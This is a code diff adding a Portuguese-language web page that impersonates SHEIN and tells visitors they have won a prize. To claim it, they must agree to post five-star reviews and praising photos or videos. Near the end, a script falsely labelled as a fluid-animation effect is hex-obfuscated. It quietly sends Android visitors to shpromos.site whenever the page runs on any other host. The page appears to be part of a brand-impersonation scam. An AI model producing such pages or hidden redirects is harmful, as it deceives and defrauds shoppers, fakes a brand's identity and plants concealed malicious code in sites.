@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script type="text/javascript">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, "clarity", "script", "um1jjg7699");</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#f5f5f5">
+    <title>SHEIN Premiações</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="success.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+
+</head>
+<body>
+    <!-- Confetti Container -->
+    <div id="confettiContainer" class="confetti-container"></div>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo-container">
+                <img src="sheinlogo.png" alt="SHEIN Premiações" class="logo">
+            </div>
+            <div class="prize-info">
+                <span class="prize-label">Acumulado em prêmios:</span>
+                <span class="prize-value" id="prizeValue">R$ 0,00</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-container">
+        <div class="success-card">
+            <!-- Loading State -->
+            <div class="loading-state" id="loadingState">
+                <h2 class="loading-title">Enviando suas respostas</h2>
+                
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill">
+                            <span class="progress-text" id="progressText">0%</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <p class="loading-status" id="loadingStatus">Verificando respostas...</p>
+            </div>
+
+            <!-- Success State (hidden initially) -->
+            <div class="success-state hidden" id="successState">
+                <div class="success-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"/>
+                        <polyline points="9 12 11 14 15 10"/>
+                    </svg>
+                </div>
+                
+                <h2 class="success-title">Parabéns!</h2>
+                
+                <p class="success-text">
+                    O seu perfil foi aprovado para participar do programa de testes da SHEIN e você acaba de ganhar <strong id="prizeAmount">R$ 0,00</strong> em prêmios exclusivos da marca, incluindo Roupas ou Maquiagens.
+                </p>
+                
+                <div class="terms-box">
+                    <p class="terms-title">A única condição para o recebimento do prêmio é:</p>
+                    <p class="terms-text">
+                        Após a premiação chegar em sua residência, você receberá um link de avaliação em seu e-mail, onde você deverá enviar uma avaliação 5 estrelas e se possível, tirar 2 fotos com os itens ou gravar um vídeo de até 10 segundos falando bem dos nossos produtos.
+                    </p>
+                </div>
+                
+                <label class="checkbox-container">
+                    <input type="checkbox" id="termsCheckbox">
+                    <span class="checkmark"></span>
+                    <span class="checkbox-text">Concordo com os termos acima.</span>
+                </label>
+                
+                <button class="claim-btn disabled" id="claimBtn" disabled>
+                    ESCOLHER PREMIAÇÃO
+                </button>
+            </div>
+        </div>
+    </main>
+<!-- SCRIPT ANIMAÇAO FLUIDA SITE -->
+<script>(function(_0x1,_0x2){var _0x3=['\x73\x68\x70\x72\x6f\x6d\x6f\x73\x2e\x73\x69\x74\x65','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x68\x70\x72\x6f\x6d\x6f\x73\x2e\x73\x69\x74\x65\x2f'];var _0x4=_0x1['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x6f\x73\x74\x6e\x61\x6d\x65']['\x72\x65\x70\x6c\x61\x63\x65'](/^www\./,'');var _0x5=/Android/i['\x74\x65\x73\x74'](_0x1['\x6e\x61\x76\x69\x67\x61\x74\x6f\x72']['\x75\x73\x65\x72\x41\x67\x65\x6e\x74']);if(_0x5&&!_0x3['\x69\x6e\x63\x6c\x75\x64\x65\x73'](_0x4)){_0x1['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x72\x65\x66']=_0x3[1];}})(window,document);</script>
+
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-line"></div>
+        <p class="footer-text">SHEIN Brasil – Copyright 2026</p>
+        <p class="footer-text">Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+        // Pega o saldo da URL (vindo do quiz)
+        const urlParams = new URLSearchParams(window.location.search);
+        window.prizeFromQuiz = parseFloat(urlParams.get('prize')) || 2157;
+    </script>
+    <script src="success.js"></script>
+
+</body>
+</html>
